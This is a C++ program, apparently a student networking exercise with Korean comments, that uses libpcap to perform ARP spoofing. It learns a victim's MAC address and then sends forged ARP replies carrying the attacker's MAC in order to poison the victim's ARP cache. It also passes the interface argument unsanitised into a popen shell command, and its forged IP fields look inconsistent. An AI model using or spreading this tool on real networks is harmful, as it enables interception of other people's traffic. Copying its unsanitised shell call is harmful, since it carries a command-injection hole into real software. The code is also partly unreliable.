#include <iostream>
#include <cstring>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

using namespace std;

// static is better than #define
static const int ETHERTYPE_ARP = 0x0806;
static const int ARPOP_REQUEST = 0x0001;
static const int ARPOP_REPLY = 0x0002;

struct ether_hdr {
    uint8_t h_dest[6];	    /* destination eth addr	*/
    uint8_t h_source[6];	/* source ether addr	*/
    uint16_t h_proto;       /* packet type ID field	*/
};

struct arp_hdr {
    uint16_t ar_hrd;      	/* Format of hardware address.  */
    uint16_t ar_pro;      	/* Format of protocol address.  */
    uint8_t ar_hln;         /* Length of hardware address.  */
    uint8_t ar_pln;         /* Length of protocol address.  */
    uint16_t ar_op;         /* ARP opcode (command).  */
    uint8_t __ar_sha[6];	/* Sender hardware address.  */
    uint8_t __ar_sip[4];    /* Sender IP address.  */
    uint8_t __ar_tha[6];	/* Target hardware address.  */
    uint8_t __ar_tip[4];    /* Target IP address.  */
};

struct hdr_tosend {
    ether_hdr eth;
    arp_hdr arph;
};

void usage() {
    printf("syntax: arp <interface> <sender ip> <target ip>\n");
    printf("sample: arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_myinterface(char *dev, uint8_t my_mac[6]) {

    // https://github.com/jungvely97/arp_spoof/blob/master/main.c
    // https://blog.naver.com/PostView.nhn?blogId=cumulusworld&logNo=220102945835

    int tohex, i = 0;
    FILE* fp;
    char cmd[300] = {0x0};
    char mac[18] = {0x0};

    sprintf(cmd, "ifconfig %s | grep HWaddr | awk '{print $5}'", dev);
    fp = popen(cmd, "r");
    // fgets 함수: FILE 구조체를 사용하여 파일 입출력 스트림에서 문자열을 가져오는 함수
    fgets(mac, sizeof(mac), fp);
    pclose(fp);

    // strtok : https://dojang.io/mod/page/view.php?id=376
    char *ptr = strtok(mac, ":"); // 공백 문자를 기준으로 문자열을 자름
    while(ptr != NULL) { // 자른 문자열이 나오지 않을 때까지 반복

        tohex = strtol(ptr, NULL, 16);
        my_mac[i] = tohex;
        i++;
        // cout << tohex;
        // cout << ptr;
        ptr = strtok(NULL, ":");
    }
    return 0;
}

int send_arp_requestpacket(pcap_t* handle, uint8_t mac[6], uint8_t sip[4], uint8_t tip[4]) {

    struct hdr_tosend *etharph = (struct hdr_tosend*)malloc(sizeof(struct hdr_tosend));

    memset(etharph->eth.h_dest, 0xff, 6);
    memcpy(etharph->eth.h_source, mac, 6);
    etharph->eth.h_proto = htons(ETHERTYPE_ARP);

    etharph->arph.ar_hrd = htons(0x0001);
    etharph->arph.ar_pro = htons(0x0800);
    etharph->arph.ar_hln = 0x06;
    etharph->arph.ar_pln = 0x04;
    etharph->arph.ar_op = htons(0x0001);

    memcpy(etharph->arph.__ar_sha, mac, 6);
    memcpy(etharph->arph.__ar_sip, sip, 4);
    memset(etharph->arph.__ar_tha, 0x00, 6);
    memcpy(etharph->arph.__ar_tip, tip, 4);

    if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
           cout << " Error send arp request packet" << endl;
           return -1;
    } else cout << " Send arp request packet" << endl;
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 4) {
        usage();
        return -1;
    }

    // Variable declaration
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t mac[6];
    uint8_t victim_mac[6];
    uint8_t victim_ip[4];
    uint8_t target_ip[4]; // = Gateway

    int res;
    int onetime = 0;
    const u_char* packet;
    struct pcap_pkthdr* header;
    struct hdr_tosend *etharph;

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    // GOOD
    inet_pton(AF_INET, argv[2], victim_ip);
    inet_pton(AF_INET, argv[3], target_ip);

    cout << "*------ Start ------*" << endl;
    get_myinterface(dev, mac);
    send_arp_requestpacket(handle, mac, target_ip, victim_ip);

    while(res = pcap_next_ex(handle, &header, &packet)) { // get captured packet data

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        etharph = (hdr_tosend*)packet;
        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == htons(ARPOP_REPLY) && memcmp(etharph->eth.h_dest, mac, 6)==0 && onetime == 0) {

            onetime = 1;
            memcpy(victim_mac, etharph->eth.h_source, 6);
            cout << " Get victim mac (for arp reply)" << endl;
            cout << "*-------------------*" << endl << endl;
        }

        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == htons(ARPOP_REPLY) && memcmp(etharph->eth.h_dest, mac, 6)==0 && onetime == 1) {

            // Sender : Attacker mac address
            memcpy(etharph->arph.__ar_sha, mac, 6);
            memcpy(etharph->eth.h_source, mac, 6);
            memcpy(etharph->arph.__ar_sip, victim_ip, 4);

            // Target
            memcpy(etharph->eth.h_dest, victim_mac, 6);
            memcpy(etharph->arph.__ar_tha, victim_mac, 6);
            memcpy(etharph->arph.__ar_tip, target_ip, 4);

            etharph->eth.h_proto = htons(ETHERTYPE_ARP);
            etharph->arph.ar_hrd = htons(0x0001);
            etharph->arph.ar_pro = htons(0x0800);
            etharph->arph.ar_hln = 0x06;
            etharph->arph.ar_pln = 0x04;
            etharph->arph.ar_op = htons(0x0002);

            if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
                   cout << "Error send arp reply packet" << endl;
                   return -1;
            } else cout << "Send arp reply packet" << endl;
        }
    }
    pcap_close(handle);
}
